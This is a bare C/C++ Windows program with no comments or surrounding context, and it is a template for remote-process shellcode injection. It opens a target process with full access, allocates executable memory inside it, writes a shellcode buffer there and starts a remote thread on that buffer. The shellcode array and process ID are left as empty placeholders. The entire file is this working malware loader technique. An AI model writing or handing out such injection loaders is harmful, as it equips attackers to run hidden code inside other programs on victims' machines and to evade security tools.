#include <windows.h>
#include <stdafx.h>
#include <stdio.h>

int main()
{
    unsigned char shellcode[] = "";
    int processId = 0;

    HANDLE processHandle = OpenProcess(PROCESS_ALL_ACCESS, FALSE, DWORD(processId));
    PVOID remoteBuffer = VirtualAllocEx(processHandle, NULL, sizeof shellcode, (MEM_RESERVE | MEM_COMMIT), PAGE_EXECUTE_READWRITE);
    WriteProcessMemory(processHandle, remoteBuffer, shellcode, sizeof shellcode, NULL);
    HANDLE remoteThread = CreateRemoteThread(processHandle, NULL, 0, (LPTHREAD_START_ROUTINE)remoteBuffer, NULL, 0, NULL);
    CloseHandle(processHandle);

    return 0;
}